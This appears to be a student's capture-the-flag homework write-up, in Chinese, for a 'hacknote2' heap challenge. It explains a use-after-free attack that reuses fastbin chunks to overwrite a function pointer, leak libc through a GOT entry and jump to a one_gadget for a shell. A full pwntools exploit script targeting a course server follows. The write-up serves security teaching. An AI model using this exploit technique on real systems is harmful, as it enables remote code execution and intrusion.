# SoftwareSecurity Hw04 - hacknote2

這題利用程式free完之後沒有將 pointer 指回 null 的 bug 來進行利用

本題在add_note的時候，會使用 malloc 去要兩塊記憶體空間
分別大小為0x10 以及另外一塊使用者自定義的size

在第一塊0x10的空間前8byte是存取一個function pointer，會在之後可以使用到

因此，這邊我們可以利用fastbin的特性，先 add 兩筆 note (content size 符合 fastbin) 之後刪除他們

之後再增加一個content大小為0x10，這樣子就能控制到前面其中一筆print_note function pointer 以及 context 的pointer

這樣就可以leak出libc的位置
之後利用差不多的特性，將 print_note function pointer 寫成libc中的one_gadget 便能拿到Shell

以下為我的script

```python

#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10139)
#r = process('./hacknote2')

read_offset = 0xf7220
read_got = 0x602040
print_note_context = 0x400886
binsh = 0x18cd17 
one_gadget_offset = 0xf0274 

def add_note(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)

def del_note(index):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(index))


def print_note(index):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(index))


add_note(0x30, "A"*0x8)
add_note(0x30, "A"*0x8)

del_note(0)
del_note(1)


add_note(0x10, p64(print_note_context) + p64(read_got))

print_note(0)
r.recvuntil(':')

libc = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00')) - read_offset

del_note(2)
print "libc:", hex(libc)

raw_input('#')
add_note(0x10, p64(libc + one_gadget_offset)+ p64(0))
print_note(0)

r.interactive()

```